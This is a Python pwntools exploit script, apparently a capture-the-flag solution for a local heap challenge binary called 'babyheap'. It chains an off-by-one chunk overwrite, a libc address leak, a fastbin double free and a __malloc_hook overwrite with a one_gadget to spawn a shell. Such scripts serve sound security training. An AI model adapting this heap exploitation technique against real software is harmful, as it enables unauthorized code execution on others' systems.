from pwn import *

p = process(["./babyheap"], env={"LD_PRELOAD":"./libc.so.6"})
context.binary = "./babyheap"
libc = ELF("./libc.so.6")

def alloc(size, data):
    p.sendlineafter("choice: ", "1")
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", data)

def show(idx):
    p.sendlineafter("choice: ", "2")
    p.sendlineafter("index: ", str(idx))

def delete(idx):
    p.sendlineafter("choice: ", "3")
    p.sendlineafter("index: ", str(idx))

alloc(0x80, "0" * 0x80)
alloc(0x80, "1" * 0x80)     # unsorted bin
alloc(0x60, "2" * 0x60)     # fastbin
alloc(0xf0, "3" * 0xf0)
alloc(0x60, "4" * 0x60)
alloc(0x60, "5" * 0x60)

delete(1)
delete(2)

alloc(0x68, "o" * 0x60 + p64(0x70 + 0x90))
delete(3)       # off-by-one -> prev_inuse bit -> off
alloc(0x80, "d" * 0x80)

show(1)
p.recvuntil("content: ")
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 0x3c4b78
malloc_hook = libc_base + libc.symbols["__malloc_hook"]
system = libc_base + libc.symbols["system"]

log.info("leak : " + hex(leak))
log.info("libc_base : " + hex(libc_base))
log.info("__malloc_hook : " + hex(malloc_hook))
log.info("system : " + hex(system))

onegadget = libc_base + 0x4526a

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL6
'''

alloc(0x60, "A" * 0x60)     # index 1, 3 ->  double free

delete(1)
delete(5)
delete(3)

alloc(0x60, p64(malloc_hook - 0x23) + "B" * 0x58)
alloc(0x60, "y" * 0x60)
alloc(0x60, "y" * 0x60)
alloc(0x60, "d" * 0x13 + p64(onegadget) + "\n")

p.interactive()
